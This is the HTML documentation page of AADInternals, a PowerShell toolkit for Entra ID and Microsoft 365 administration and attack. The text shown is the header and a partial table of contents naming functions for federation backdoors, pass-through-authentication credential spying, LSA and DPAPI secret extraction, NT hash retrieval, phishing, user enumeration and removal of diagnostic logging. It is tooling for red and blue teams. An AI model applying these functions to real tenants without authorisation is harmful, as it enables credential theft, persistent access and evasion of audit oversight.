<html lang="en-gb" class="js"><head>
<meta charset="UTF-8">
<meta http-equiv="cache-control" content="no-cache"> 
<meta http-equiv="expires" content="0"> 
<meta http-equiv="pragma" content="no-cache">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Documentation</title>
<meta name="description" content="The toolkit for Azure AD hackers, bounty hunters, red/blue teamers">
<meta name="generator" content="Hugo 0.39">
<meta property="og:title" content="Documentation">
<meta property="og:description" content="AAD Internals PowerShell module">
<meta property="og:type" content="article">
<meta property="og:url" content="https://aadinternals.com/aadinternals/">



<meta property="article:published_time" content="2018-10-25T00:00:00+00:00">

<meta property="article:modified_time" content="2024-01-14T00:00:00+00:00">











<link rel="dns-prefetch" href="//fonts.googleapis.com">
<link rel="dns-prefetch" href="//fonts.gstatic.com">

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all">
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="/css/style.css" type="text/css" media="all">
<script type="text/javascript" src="/js/scripts.js"></script>
<script type="text/javascript" src="/js/tools.js"></script>

<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196">
<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96">
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16">
<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128">
<meta name="application-name" content="&nbsp;">
<meta name="msapplication-TileColor" content="#FFFFFF">
<meta name="msapplication-TileImage" content="/images/mstile-144x144.png">
<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png">
<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png">
<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png">
<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png">




<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-3XCVLYZKDW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-3XCVLYZKDW');
</script>

</head>
<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
	<div class="container container-outer">
		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
		
			<div class="container container-inner clearfix">
			
				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
				
					<a class="logo__link" href="/" title="AADInternals.com" rel="home">
						<img src="/images/favicon-128.png" alt="Homepage"><h1 class="logo__title">AADInternals.com</h1>
						<h2 class="logo__tagline">The ultimate Entra ID (Azure AD) / Microsoft 365 hacking and admin toolkit</h2>
					</a>
				</div>
			</div>
			
<a href="#" class="menu__toggle" aria-hidden="true">Menu</a><nav class="menu menu--collapse menu--collapse-0 closed" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement" style="transition: max-height 284ms; position: relative;" aria-hidden="false">
	<ul class="menu__list">
		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD KILL CHAIN</a></li>
		<li class="menu__item menu__item--active"><a class="menu__link" href="/aadinternals/">DOCUMENTATION</a></li>
		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/osint/">OSINT</a></li>
		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
	</ul>
</nav>

		</header>
		<div class="wrapper clearfix">

<main class="main-content content" role="main" itemprop="mainContentOfPage">
	<article class="post">
		<header class="post__header clearfix">
			<h1 class="post__title">Documentation</h1>
			<p class="post__meta meta">
				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"></path></svg>
				<time class="post__meta-date" datetime="2018-10-25T00:00:00">October 25, 2018</time>
					<time class="post__meta-lastmod" datetime="2024-01-14T00:00:00"> (Last Modified: January 14, 2024)</time>
				<span class="post__meta-categories meta-categories">
					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"></path></svg>
					<a class="meta-categories__link" href="/categories/article" rel="category">article</a></span>
			</p>
			<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=https%3a%2f%2faadinternals.com%2faadinternals%2f&amp;text=Documentation&amp;tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=https%3a%2f%2faadinternals.com%2faadinternals%2f&amp;mini=true&amp;title=Documentation&amp;summary=AAD%20Internals%20PowerShell%20module&amp;source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
		</header>
		<div class="post__content clearfix">
				<nav id="TableOfContents">
<ul>
<li><a href="#introduction">Introduction</a>
<ul>
<li><a href="#installation">Installation</a></li>
<li><a href="#about">About</a></li>
<li><a href="#version-info">Version info</a></li>
<li><a href="#configuration">Configuration</a>
<ul>
<li><a href="#read-aadintconfiguration">Read-AADIntConfiguration</a></li>
<li><a href="#save-aadintconfiguration">Save-AADIntConfiguration</a></li>
<li><a href="#get-aadintconfiguration">Get-AADIntConfiguration</a></li>
<li><a href="#set-aadintsetting">Set-AADIntSetting</a></li>
<li><a href="#set-aadintuseragent">Set-AADIntUserAgent</a></li>
</ul></li>
</ul></li>
<li><a href="#functionality">Functionality</a>
<ul>
<li><a href="#playing-with-access-tokens">Playing with access tokens</a>
<ul>
<li><a href="#get-aadintaccesstokenfor-lt-service">Get-AADIntAccessTokenFor&lt;Service&gt;</a></li>
<li><a href="#get-aadintaccesstoken">Get-AADIntAccessToken</a></li>
<li><a href="#get-aadintaccesstokenwithrefreshtoken">Get-AADIntAccessTokenWithRefreshToken</a></li>
<li><a href="#export-aadintazureclitokens">Export-AADIntAzureCliTokens</a></li>
<li><a href="#export-aadintteamstokens">Export-AADIntTeamsTokens</a></li>
<li><a href="#export-aadinttokenbrokertokens">Export-AADIntTokenBrokerTokens</a></li>
<li><a href="#get-aadintaccesstokenusingimds">Get-AADIntAccessTokenUsingIMDS</a></li>
<li><a href="#token-cache">Token cache</a></li>
</ul></li>
<li><a href="#tenant-information-and-manipulation-functions">Tenant information and manipulation functions</a>
<ul>
<li><a href="#get-aadintlogininformation">Get-AADIntLoginInformation (*)</a></li>
<li><a href="#get-aadintendpointinstances">Get-AADIntEndpointInstances (*)</a></li>
<li><a href="#get-aadintendpointips">Get-AADIntEndpointIps (*)</a></li>
<li><a href="#get-aadinttenantdetails-a">Get-AADIntTenantDetails (A)</a></li>
<li><a href="#get-aadinttenantid">Get-AADIntTenantID (*)</a></li>
<li><a href="#get-aadintopenidconfiguration">Get-AADIntOpenIDConfiguration (*)</a></li>
<li><a href="#get-aadintservicelocations-a">Get-AADIntServiceLocations (A)</a></li>
<li><a href="#get-aadintserviceplans-a">Get-AADIntServicePlans (A)</a></li>
<li><a href="#get-aadintserviceprincipals-a">Get-AADIntServicePrincipals (A)</a></li>
<li><a href="#get-aadintsubscriptions-a">Get-AADIntSubscriptions (A)</a></li>
<li><a href="#get-aadintsposerviceinformation-a">Get-AADIntSPOServiceInformation (A)</a></li>
<li><a href="#get-aadintcompanyinformation-a">Get-AADIntCompanyInformation (A)</a></li>
<li><a href="#get-aadintcompanytags-a">Get-AADIntCompanyTags (A)</a></li>
<li><a href="#get-aadintaadconnectstatus-z">Get-AADIntAADConnectStatus (Z)</a></li>
<li><a href="#get-aadintsyncconfiguration-a">Get-AADIntSyncConfiguration (A)</a></li>
<li><a href="#get-aadinttenantdomain-m">Get-AADIntTenantDomain (M)</a></li>
<li><a href="#get-aadinttenantdomains">Get-AADIntTenantDomains (*)</a></li>
<li><a href="#new-aadintmoeradomain-z">New-AADIntMOERADomain (Z)</a></li>
<li><a href="#get-aadintkerberosdomainsyncconfig-a">Get-AADIntKerberosDomainSyncConfig (A)</a></li>
<li><a href="#get-aadintwindowscredentialssyncconfig-a">Get-AADIntWindowsCredentialsSyncConfig (A)</a></li>
<li><a href="#get-aadintsyncdeviceconfiguration-a">Get-AADIntSyncDeviceConfiguration (A)</a></li>
<li><a href="#get-aadinttenantauthpolicy-m">Get-AADIntTenantAuthPolicy (M)</a></li>
<li><a href="#get-aadinttenantguestaccess-m">Get-AADIntTenantGuestAccess (M)</a></li>
<li><a href="#set-aadinttenantguestaccess-m">Set-AADIntTenantGuestAccess (M)</a></li>
<li><a href="#enable-aadinttenantmsolaccess-m">Enable-AADIntTenantMsolAccess (M)</a></li>
<li><a href="#disable-aadinttenantmsolaccess-m">Disable-AADIntTenantMsolAccess (M)</a></li>
<li><a href="#get-aadintunifiedauditlogsettings-e">Get-AADIntUnifiedAuditLogSettings (E)</a></li>
<li><a href="#set-aadintunifiedauditlogsettings-e">Set-AADIntUnifiedAuditLogSettings (E)</a></li>
<li><a href="#get-aadintcomplianceapicookies">Get-AADIntComplianceAPICookies</a></li>
<li><a href="#search-aadintunifiedauditlog-ca">Search-AADIntUnifiedAuditLog (CA)</a></li>
<li><a href="#get-aadintconditionalaccesspolicies-a">Get-AADIntConditionalAccessPolicies (A)</a></li>
<li><a href="#get-aadintazureadpolicies-a">Get-AADIntAzureADPolicies (A)</a></li>
<li><a href="#set-aadintazureadpolicydetails-a">Set-AADIntAzureADPolicyDetails (A)</a></li>
<li><a href="#get-aadintselfservicepurchaseproducts-cm">Get-AADIntSelfServicePurchaseProducts (CM)</a></li>
<li><a href="#set-aadintselfservicepurchaseproduct-cm">Set-AADIntSelfServicePurchaseProduct (CM)</a></li>
<li><a href="#unprotect-aadintestsauthpersistentcookie">Unprotect-AADIntEstsAuthPersistentCookie (*)</a></li>
<li><a href="#get-aadintsyncfeatures-a">Get-AADIntSyncFeatures (A)</a></li>
<li><a href="#set-aadintsyncfeatures-a">Set-AADIntSyncFeatures (A)</a></li>
<li><a href="#get-aadinttenantorganisationinformation-ad">Get-AADIntTenantOrganisationInformation (AD)</a></li>
<li><a href="#get-aadintazureadfeatures-a">Get-AADIntAzureADFeatures (A)</a></li>
<li><a href="#get-aadintazureadfeature-a">Get-AADIntAzureADFeature (A)</a></li>
<li><a href="#set-aadintazureadfeature-a">Set-AADIntAzureADFeature (A)</a></li>
</ul></li>
<li><a href="#rollout-policy-functions">Rollout policy functions</a>
<ul>
<li><a href="#get-aadintrolloutpolicies-m">Get-AADIntRolloutPolicies (M)</a></li>
<li><a href="#set-aadintrolloutpolicy-m">Set-AADIntRolloutPolicy (M)</a></li>
<li><a href="#remove-aadintrolloutpolicy-m">Remove-AADIntRolloutPolicy (M)</a></li>
<li><a href="#get-aadintrolloutpolicygroups-m">Get-AADIntRolloutPolicyGroups (M)</a></li>
<li><a href="#add-aadintrolloutpolicygroups-m">Add-AADIntRolloutPolicyGroups (M)</a></li>
<li><a href="#remove-aadintrolloutpolicygroups-m">Remove-AADIntRolloutPolicyGroups (M)</a></li>
</ul></li>
<li><a href="#utilities">Utilities</a>
<ul>
<li><a href="#read-aadintaccesstoken">Read-AADIntAccesstoken (*)</a></li>
<li><a href="#get-aadintimmutableid">Get-AADIntImmutableID (*)</a></li>
<li><a href="#start-aadintcloudshell-c">Start-AADIntCloudShell ( C)</a></li>
<li><a href="#set-aadintproxysettings">Set-AADIntProxySettings</a></li>
</ul></li>
<li><a href="#user-manipulation">User manipulation</a>
<ul>
<li><a href="#get-aadintusers-a">Get-AADIntUsers (A)</a></li>
<li><a href="#get-aadintuser-a">Get-AADIntUser (A)</a></li>
<li><a href="#new-aadintuser-a">New-AADIntUser (A)</a></li>
<li><a href="#set-aadintuser-a">Set-AADIntUser (A)</a></li>
<li><a href="#remove-aadintuser-a">Remove-AADIntUser (A)</a></li>
<li><a href="#get-aadintglobaladmins-a">Get-AADIntGlobalAdmins (A)</a></li>
</ul></li>
<li><a href="#user-mfa-manipulation">User MFA manipulation</a>
<ul>
<li><a href="#get-aadintusermfa-a">Get-AADIntUserMFA (A)</a></li>
<li><a href="#set-aadintusermfa-a">Set-AADIntUserMFA (A)</a></li>
<li><a href="#get-aadintusermfaapps-a">Get-AADIntUserMFAApps (A)</a></li>
<li><a href="#set-aadintusermfaapps-a">Set-AADIntUserMFAApps (A)</a></li>
<li><a href="#register-aadintmfaapp-my">Register-AADIntMFAApp (MY)</a></li>
<li><a href="#new-aadintotpsecret">New-AADIntOTPSecret</a></li>
<li><a href="#new-aadintotp">New-AADIntOTP</a></li>
<li><a href="#set-aadintdevicewhfbkey">Set-AADIntDeviceWHfBKey</a></li>
</ul></li>
<li><a href="#user-manipulation-with-ad-sync-api">User manipulation with AD sync api</a>
<ul>
<li><a href="#get-aadintsyncobjects-a">Get-AADIntSyncObjects (A)</a></li>
<li><a href="#set-aadintazureadobject-a">Set-AADIntAzureADObject (A)</a></li>
<li><a href="#remove-aadintazureadobject-a">Remove-AADIntAzureADObject (A)</a></li>
<li><a href="#set-aadintazureadgroupmember-a">Set-AADIntAzureADGroupMember (A)</a></li>
<li><a href="#set-aadintuserpassword-a">Set-AADIntUserPassword (A)</a></li>
<li><a href="#reset-aadintserviceaccount-a">Reset-AADIntServiceAccount (A)</a></li>
</ul></li>
<li><a href="#exchange-online-functions">Exchange Online functions</a>
<ul>
<li><a href="#get-aadinteasautodiscover">Get-AADIntEASAutoDiscover (*)</a></li>
<li><a href="#get-aadinteasautodiscoverv1-e">Get-AADIntEASAutoDiscoverV1 (E)</a></li>
<li><a href="#set-aadinteassettings-e">Set-AADIntEASSettings (E)</a></li>
<li><a href="#get-aadintmobiledevices-e">Get-AADIntMobileDevices (E)</a></li>
<li><a href="#send-aadinteasmessage-e">Send-AADIntEASMessage (E)</a></li>
<li><a href="#send-aadintoutlookmessage-e">Send-AADIntOutlookMessage (E)</a></li>
<li><a href="#open-aadintowa-o">Open-AADIntOWA (O)</a></li>
</ul></li>
<li><a href="#sharepoint-online-functions">SharePoint Online functions</a>
<ul>
<li><a href="#get-aadintspositeusers-s">Get-AADIntSPOSiteUsers (S)</a></li>
<li><a href="#get-aadintspouserproperties-s">Get-AADIntSPOUserProperties (S)</a></li>
<li><a href="#get-aadintspositegroups-s">Get-AADIntSPOSiteGroups (S)</a></li>
<li><a href="#set-aadintspositemembers-s">Set-AADIntSPOSiteMembers (S)</a></li>
<li><a href="#export-aadintspositefile-s">Export-AADIntSPOSiteFile (S)</a></li>
<li><a href="#add-aadintspositefiles-s">Add-AADIntSPOSiteFiles (S)</a></li>
<li><a href="#update-aadintspositefile-s">Update-AADIntSPOSiteFile (S)</a></li>
</ul></li>
<li><a href="#onedrive-for-business-functions">OneDrive for Business functions</a>
<ul>
<li><a href="#new-aadintonedrivesettings">New-AADIntOneDriveSettings</a></li>
<li><a href="#get-aadintonedrivefiles-o">Get-AADIntOneDriveFiles (O)</a></li>
<li><a href="#send-aadintonedrivefile-o">Send-AADIntOneDriveFile (O)</a></li>
</ul></li>
<li><a href="#teams-functions">Teams functions</a>
<ul>
<li><a href="#get-aadintskypetoken-t">Get-AADIntSkypeToken (T)</a></li>
<li><a href="#set-aadintteamsavailability-t">Set-AADIntTeamsAvailability (T)</a></li>
<li><a href="#set-aadintteamsstatusmessage-t">Set-AADIntTeamsStatusMessage (T)</a></li>
<li><a href="#search-aadintteamsuser-t">Search-AADIntTeamsUser (T)</a></li>
<li><a href="#send-aadintteamsmessage-t">Send-AADIntTeamsMessage (T)</a></li>
<li><a href="#get-aadintteamsmessages-t">Get-AADIntTeamsMessages (T)</a></li>
<li><a href="#set-aadintteamsmessageemotion-t">Set-AADIntTeamsMessageEmotion (T)</a></li>
<li><a href="#remove-aadintteamsmessages-t">Remove-AADIntTeamsMessages (T)</a></li>
<li><a href="#find-aadintteamsexternaluser-t">Find-AADIntTeamsExternalUser (T)</a></li>
<li><a href="#get-aadintteamsavailability-t">Get-AADIntTeamsAvailability (T)</a></li>
<li><a href="#get-aadinttranslation-t">Get-AADIntTranslation (T)</a></li>
<li><a href="#get-aadintmyteams-t">Get-AADIntMyTeams (T)</a></li>
</ul></li>
<li><a href="#hack-functions-identity-federation">Hack functions: Identity Federation</a>
<ul>
<li><a href="#set-aadintdomainauthentication-a">Set-AADIntDomainAuthentication (A)</a></li>
<li><a href="#convertto-aadintbackdoor-a">ConvertTo-AADIntBackdoor (A)</a></li>
<li><a href="#new-aadintbackdoor-a">New-AADIntBackdoor (A)</a></li>
<li><a href="#open-aadintoffice365portal">Open-AADIntOffice365Portal (*)</a></li>
</ul></li>
<li><a href="#hack-functions-pass-through-authentication-pta">Hack functions: Pass-through authentication (PTA)</a>
<ul>
<li><a href="#set-aadintpassthroughauthentication-p">Set-AADIntPassThroughAuthentication (P)</a></li>
<li><a href="#install-aadintptaspy">Install-AADIntPTASpy (*)</a></li>
<li><a href="#get-aadintptaspylog">Get-AADIntPTASpyLog (*)</a></li>
<li><a href="#remove-aadintptaspy">Remove-AADIntPTASpy (*)</a></li>
<li><a href="#register-aadintptaagent-p">Register-AADIntPTAAgent (P)</a></li>
<li><a href="#register-aadintsyncagent-p">Register-AADIntSyncAgent (P)</a></li>
<li><a href="#set-aadintptacertificate">Set-AADIntPTACertificate (*)</a></li>
<li><a href="#get-aadintproxyagents-p">Get-AADIntProxyAgents (P)</a></li>
<li><a href="#get-aadintproxyagentgroups-p">Get-AADIntProxyAgentGroups (P)</a></li>
<li><a href="#export-aadintproxyagentcertificates">Export-AADIntProxyAgentCertificates</a></li>
<li><a href="#export-aadintproxyagentbootstraps">Export-AADIntProxyAgentBootstraps</a></li>
</ul></li>
<li><a href="#hack-functions-directory-synchronization">Hack functions: Directory Synchronization</a>
<ul>
<li><a href="#set-aadintpasswordhashsyncenabled-a">Set-AADIntPasswordHashSyncEnabled (A)</a></li>
<li><a href="#new-aadintguestinvitation-z">New-AADIntGuestInvitation (Z)</a></li>
<li><a href="#get-aadintsynccredentials">Get-AADIntSyncCredentials (*)</a></li>
<li><a href="#update-aadintsynccredentials">Update-AADIntSyncCredentials (*)</a></li>
<li><a href="#get-aadintsyncencryptionkeyinfo">Get-AADIntSyncEncryptionKeyInfo (*)</a></li>
<li><a href="#get-aadintsyncencryptionkey">Get-AADIntSyncEncryptionKey (*)</a></li>
<li><a href="#get-aadintusernthash">Get-AADIntUserNTHash</a></li>
<li><a href="#install-aadintforcenthash">Install-AADIntForceNTHash</a></li>
<li><a href="#remove-aadintforcenthash">Remove-AADIntForceNTHash</a></li>
<li><a href="#initialize-aadintfullpasswordsync">Initialize-AADIntFullPasswordSync</a></li>
</ul></li>
<li><a href="#hack-functions-adfs">Hack functions: ADFS</a>
<ul>
<li><a href="#new-aadintadfsselfsignedcertificates">New-AADIntADFSSelfSignedCertificates (*)</a></li>
<li><a href="#restore-aadintadfsautorollover">Restore-AADIntADFSAutoRollover (*)</a></li>
<li><a href="#update-aadintadfsfederationsettings-a">Update-AADIntADFSFederationSettings (A)</a></li>
<li><a href="#export-aadintadfscertificates">Export-AADIntADFSCertificates (*)</a></li>
<li><a href="#export-aadintadfsconfiguration">Export-AADIntADFSConfiguration (*)</a></li>
<li><a href="#export-aadintadfsencryptionkey">Export-AADIntADFSEncryptionKey (*)</a></li>
<li><a href="#set-aadintadfsconfiguration">Set-AADIntADFSConfiguration (*)</a></li>
<li><a href="#get-aadintadfspolicystorerules">Get-AADIntADFSPolicyStoreRules (*)</a></li>
<li><a href="#set-aadintadfspolicystorerules">Set-AADIntADFSPolicyStoreRules (*)</a></li>
<li><a href="#new-aadintadfsrefreshtoken">New-AADIntADFSRefreshToken (*)</a></li>
<li><a href="#unprotect-aadintadfsrefreshtoken">Unprotect-AADIntADFSRefreshToken (*)</a></li>
</ul></li>
<li><a href="#hack-functions-seamless-single-sign-on-desktopsso">Hack functions: Seamless Single-sign-on (DesktopSSO)</a>
<ul>
<li><a href="#get-aadintdesktopsso-p">Get-AADIntDesktopSSO (P)</a></li>
<li><a href="#set-aadintdesktopssoenabled-p">Set-AADIntDesktopSSOEnabled (P)</a></li>
<li><a href="#set-aadintdesktopsso-p">Set-AADIntDesktopSSO (P)</a></li>
<li><a href="#new-aadintkerberosticket">New-AADIntKerberosTicket</a></li>
</ul></li>
<li><a href="#hack-functions-active-directory">Hack functions: Active Directory</a>
<ul>
<li><a href="#get-aadintdpapikeys">Get-AADIntDPAPIKeys (*)</a></li>
<li><a href="#get-aadintlsasecrets">Get-AADIntLSASecrets (*)</a></li>
<li><a href="#get-aadintlsabackupkeys">Get-AADIntLSABackupKeys (*)</a></li>
<li><a href="#get-aadintsystemmasterkeys">Get-AADIntSystemMasterKeys (*)</a></li>
<li><a href="#get-aadintusermasterkeys">Get-AADIntUserMasterKeys (*)</a></li>
<li><a href="#get-aadintlocalusercredentials">Get-AADIntLocalUserCredentials (*)</a></li>
</ul></li>
<li><a href="#hack-functions-azure-ad-join-mdm-prt">Hack functions: Azure AD join, MDM &amp; PRT</a>
<ul>
<li><a href="#get-aadintuserprttoken">Get-AADIntUserPRTToken (*)</a></li>
<li><a href="#join-aadintonpremdevicetoazuread-a">Join-AADIntOnPremDeviceToAzureAD (A)</a></li>
<li><a href="#join-aadintdevicetoazuread-j">Join-AADIntDeviceToAzureAD (J)</a></li>
<li><a href="#get-aadintuserprtkeys">Get-AADIntUserPRTKeys (*)</a></li>
<li><a href="#new-aadintuserprttoken">New-AADIntUserPRTToken (*)</a></li>
<li><a href="#new-aadintbulkprttoken-a">New-AADIntBulkPRTToken (A)</a></li>
<li><a href="#new-aadintp2pdevicecertificate">New-AADIntP2PDeviceCertificate (*)</a></li>
<li><a href="#join-aadintdevicetointunemdm-m">Join-AADIntDeviceToIntuneMDM (M)</a></li>
<li><a href="#start-aadintdevicedmsync">Start-AADIntDeviceDMSync (*)</a></li>
<li><a href="#get-aadintdeviceregauthmethods-a">Get-AADIntDeviceRegAuthMethods (A)</a></li>
<li><a href="#set-aadintdeviceregauthmethods-a">Set-AADIntDeviceRegAuthMethods (A)</a></li>
<li><a href="#get-aadintdevicetransportkey-a">Get-AADIntDeviceTransportKey (A)</a></li>
<li><a href="#set-aadintdevicetransportkey-a">Set-AADIntDeviceTransportKey (A)</a></li>
<li><a href="#get-aadintdevicecompliance-a">Get-AADIntDeviceCompliance (A)</a></li>
<li><a href="#set-aadintdevicecompliant-a">Set-AADIntDeviceCompliant (A)</a></li>
<li><a href="#export-aadintlocaldevicecertificate">Export-AADIntLocalDeviceCertificate</a></li>
<li><a href="#export-aadintlocaldevicetransportkey">Export-AADIntLocalDeviceTransportKey</a></li>
<li><a href="#join-aadintlocaldevicetoazuread">Join-AADIntLocalDeviceToAzureAD</a></li>
<li><a href="#add-aadintsyncfabricserviceprincipal-a">Add-AADIntSyncFabricServicePrincipal (A)</a></li>
</ul></li>
<li><a href="#client-functions">Client functions</a>
<ul>
<li><a href="#get-aadintofficeupdatebranch">Get-AADIntOfficeUpdateBranch</a></li>
<li><a href="#set-aadintofficeupdatebranch">Set-AADIntOfficeUpdateBranch</a></li>
</ul></li>
<li><a href="#support-and-recovery-assistant-sara">Support and Recovery Assistant (SARA)</a>
<ul>
<li><a href="#test-aadintsaraport">Test-AADIntSARAPort</a></li>
<li><a href="#resolve-aadintsarahost">Resolve-AADIntSARAHost</a></li>
<li><a href="#get-aadintsarauserinfo">Get-AADIntSARAUserInfo</a></li>
<li><a href="#get-aadintsaratenantinfo">Get-AADIntSARATenantInfo</a></li>
</ul></li>
<li><a href="#azure-functions">Azure functions</a>
<ul>
<li><a href="#grant-aadintazureuseraccessadminrole-ac">Grant-AADIntAzureUserAccessAdminRole (AC)</a></li>
<li><a href="#get-aadintazuresubscriptions-ac">Get-AADIntAzureSubscriptions (AC)</a></li>
<li><a href="#set-aadintazureroleassignment-ac">Set-AADIntAzureRoleAssignment (AC)</a></li>
<li><a href="#get-aadintazureclassicadministrators-ac">Get-AADIntAzureClassicAdministrators (AC)</a></li>
<li><a href="#get-aadintazureresourcegroups-ac">Get-AADIntAzureResourceGroups (AC)</a></li>
<li><a href="#get-aadintazurevms-ac">Get-AADIntAzureVMs (AC)</a></li>
<li><a href="#invoke-aadintazurevmscript-ac">Invoke-AADIntAzureVMScript (AC)</a></li>
<li><a href="#get-aadintazurevmrdpsettings-ac">Get-AADIntAzureVMRdpSettings (AC)</a></li>
<li><a href="#get-aadintazuretenants-ac">Get-AADIntAzureTenants (AC)</a></li>
<li><a href="#get-aadintazureinformation-ac">Get-AADIntAzureInformation (AC)</a></li>
<li><a href="#get-aadintazuresigninlog-m">Get-AADIntAzureSignInLog (M)</a></li>
<li><a href="#get-aadintazureauditlog-m">Get-AADIntAzureAuditLog (M)</a></li>
<li><a href="#remove-aadintazurediagnosticsettings-ac">Remove-AADIntAzureDiagnosticSettings (AC)</a></li>
<li><a href="#get-aadintazurediagnosticsettings-ac">Get-AADIntAzureDiagnosticSettings (AC)</a></li>
<li><a href="#get-aadintazurediagnosticsettingsdetails-ac">Get-AADIntAzureDiagnosticSettingsDetails (AC)</a></li>
<li><a href="#set-aadintazurediagnosticsettingsdetails-ac">Set-AADIntAzureDiagnosticSettingsDetails (AC)</a></li>
<li><a href="#get-aadintazuredirectoryactivitylog-ac">Get-AADIntAzureDirectoryActivityLog (AC)</a></li>
<li><a href="#get-aadintazurewireserveraddress">Get-AADIntAzureWireServerAddress</a></li>
</ul></li>
<li><a href="#hybrid-health-functions">Hybrid Health functions</a>
<ul>
<li><a href="#new-aadinthybridhealthservice-ac">New-AADIntHybridHealthService (AC)</a></li>
<li><a href="#get-aadinthybridhealthservices-ac">Get-AADIntHybridHealthServices (AC)</a></li>
<li><a href="#remove-aadinthybridhealthservice-ac">Remove-AADIntHybridHealthService (AC)</a></li>
<li><a href="#new-aadinthybridhealthservicemember-ac">New-AADIntHybridHealthServiceMember (AC)</a></li>
<li><a href="#get-aadinthybridhealthservicemembers-ac">Get-AADIntHybridHealthServiceMembers (AC)</a></li>
<li><a href="#remove-aadinthybridhealthservicemember-ac">Remove-AADIntHybridHealthServiceMember (AC)</a></li>
<li><a href="#get-aadinthybridhealthservicemonitoringpolicies-ac">Get-AADIntHybridHealthServiceMonitoringPolicies (AC)</a></li>
<li><a href="#send-aadinthybridhealthserviceevents">Send-AADIntHybridHealthServiceEvents</a></li>
<li><a href="#new-aadinthybridhealtserviceevent-ac">New-AADIntHybridHealtServiceEvent (AC)</a></li>
<li><a href="#register-aadinthybridhealthserviceagent-ac">Register-AADIntHybridHealthServiceAgent (AC)</a></li>
</ul></li>
<li><a href="#kill-chain-functions">Kill chain functions</a>
<ul>
<li><a href="#invoke-aadintreconasoutsider">Invoke-AADIntReconAsOutsider</a></li>
<li><a href="#invoke-aadintuserenumerationasoutsider">Invoke-AADIntUserEnumerationAsOutsider</a></li>
<li><a href="#invoke-aadintreconasguest-ac">Invoke-AADIntReconAsGuest (AC)</a></li>
<li><a href="#invoke-aadintuserenumerationasguest-ac">Invoke-AADIntUserEnumerationAsGuest (AC)</a></li>
<li><a href="#invoke-aadintreconasinsider-ac">Invoke-AADIntReconAsInsider (AC)</a></li>
<li><a href="#invoke-aadintuserenumerationasinsider-ac">Invoke-AADIntUserEnumerationAsInsider (AC)</a></li>
<li><a href="#invoke-aadintphishing">Invoke-AADIntPhishing</a></li>
</ul></li>
<li><a href="#drs-functions">DRS functions</a>
<ul>
<li><a href="#get-aadintadusernthash">Get-AADIntAdUserNTHash (*)</a></li>
<li><a href="#get-aadintaduserthumbnailphoto">Get-AADIntADUserThumbnailPhoto (*)</a></li>
<li><a href="#get-aadintdesktopssoaccountpassword">Get-AADIntDesktopSSOAccountPassword (*)</a></li>
</ul></li>
<li><a href="#ms-partner-functions">MS Partner functions</a>
<ul>
<li><a href="#new-aadintmspartnerdelegatedadminrequest">New-AADIntMSPartnerDelegatedAdminRequest (*)</a></li>
<li><a href="#approve-aadintmspartnerdelegatedadminrequest-ad">Approve-AADIntMSPartnerDelegatedAdminRequest (AD)</a></li>
<li><a href="#remove-aadintmspartnerdelegatedadminroles-ad">Remove-AADIntMSPartnerDelegatedAdminRoles (AD)</a></li>
<li><a href="#get-aadintmspartners-ad">Get-AADIntMSPartners (AD)</a></li>
<li><a href="#get-aadintmspartnerorganizations-mp">Get-AADIntMSPartnerOrganizations (MP)</a></li>
<li><a href="#get-aadintmspartnerrolemembers-mp">Get-AADIntMSPartnerRoleMembers (MP)</a></li>
<li><a href="#get-aadintmspartnercontracts-a">Get-AADIntMSPartnerContracts (A)</a></li>
<li><a href="#find-aadintmspartners">Find-AADIntMSPartners</a></li>
</ul></li>
<li><a href="#onenote-functions">OneNote functions</a>
<ul>
<li><a href="#start-aadintspeech-on">Start-AADIntSpeech (ON)</a></li>
</ul></li>
<li><a href="#certificate-based-authentication-cba">Certificate Based Authentication (CBA)</a>
<ul>
<li><a href="#get-aadintadminportalaccesstokenusingcba">Get-AADIntAdminPortalAccessTokenUsingCBA</a></li>
